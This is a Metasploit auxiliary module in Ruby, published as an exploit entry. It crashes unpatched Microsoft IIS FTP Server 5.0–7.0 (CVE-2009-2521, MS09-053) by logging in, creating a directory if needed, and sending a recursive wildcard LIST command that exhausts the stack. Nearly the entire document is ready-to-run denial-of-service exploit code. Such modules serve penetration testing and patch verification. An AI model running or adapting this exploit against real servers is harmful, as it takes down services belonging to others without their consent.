# Exploit Title: [MS09-053] Microsoft IIS FTP Server <= 7.0 Stack Exhaustion DoS
# Date: Jul 03, 2011
# Updated: Jul 13, 2011
# Author: Myo Soe <YGN Ethical Hacker Group - http://yehg.net/>
# Software Link: http://www.microsoft.com/
# Version: 5.0 - 7.0
# Tested on: unpatched version of windows xp & 2k3

##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Ftp
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft IIS FTP Server <= 7.0 LIST Stack Exhaustion Denial of Service',
			'Description'    => %q{
				This module triggers Denial of Service condition in the Microsoft Internet Information Services (IIS) FTP Server 5.0 through 7.0 via a list (ls) -R command containing a wildcard. For this exploit to work in most cases, you need 1) a valid ftp account: either read-only or write-access account 2) the "FTP Publishing" service must be configured as "manual" mode in startup type 3) there must be at least one directory under FTP root directory. If your provided FTP account has write-access privilege and there is no single directory, a new directory with random name will be created prior to sending exploit payload.
			},
			'Author'         => [
					'Nikolaos "Kingcope" Rangos',  # Bug Discoverer
					'Myo Soe <YGN Ethical Hacker Group, http://yehg.net/>'  # Metasploit Module
					],	
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 4 $',
			'References'     =>
				[
					[ 'CVE', '2009-2521'],
					[ 'BID', '36273'],
					[ 'OSVDB', '57753'],
					[ 'URL', 'https://www.microsoft.com/technet/security/Bulletin/MS09-053.mspx'],
					[ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0040.html']

				],
			'DisclosureDate' => 'Sep 03 2009'))

		register_options([
			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'mozilla@example.com' ])
		])
	end

	def run				
		begin
			return unless connect_login
			print_status('Checking if there is at least one directory ...')	
			res = send_cmd_data(['ls'],'')	
			
			if res.to_s =~ /\<DIR\>          / then
				print_status('Directory found, skipped creating a directory')
			else
				print_status('No single directory found')
				print_status('Attempting to create a directory ...')	
				new_dir = Rex::Text.rand_text_alphanumeric(6)		
				res = send_cmd(['mkd',new_dir])			
				if res =~ /directory created/ then
					print_status("New directory \"#{new_dir}\" was created!")
				else
					print_error('Write-access was denied')
					print_error('Exploit failed')
					disconnect
					return
				end		
			end		
			
			print_status("Sending DoS packets ...")	
			res = send_cmd_datax(['ls','-R */../'],' ')				
			disconnect				
		rescue ::Interrupt
			raise $!
		rescue Errno::ECONNRESET
			print_good("MS IIS FTP Server has crashed successfully.")	
		rescue ::Rex::ConnectionRefused
			print_good("Cannot connect. The server is not running.")	
		end
	end

	# Workaround: modified send_cmd_data function with short sleep time before data_disconnect call
	# Bug Tracker: 4868
	def send_cmd_datax(args, data, mode = 'a', nsock = self.sock)
		args[0] = "LIST"
		# Set the transfer mode and connect to the remove server
		return nil if not data_connect(mode)
		# Our pending command should have got a connection now.
		res = send_cmd(args, true, nsock)
		# make sure could open port
		return nil unless res =~ /^(150|125) /
		# dispatch to the proper method
		begin
			data = self.datasocket.get_once(-1, ftp_timeout)
		rescue ::EOFError
			data = nil
		end
		select(nil,nil,nil,1)
		# close data channel so command channel updates
		data_disconnect
		# get status of transfer
		ret = nil
		ret = recv_ftp_resp(nsock)
		ret = [ ret, data ]
		ret
	end

end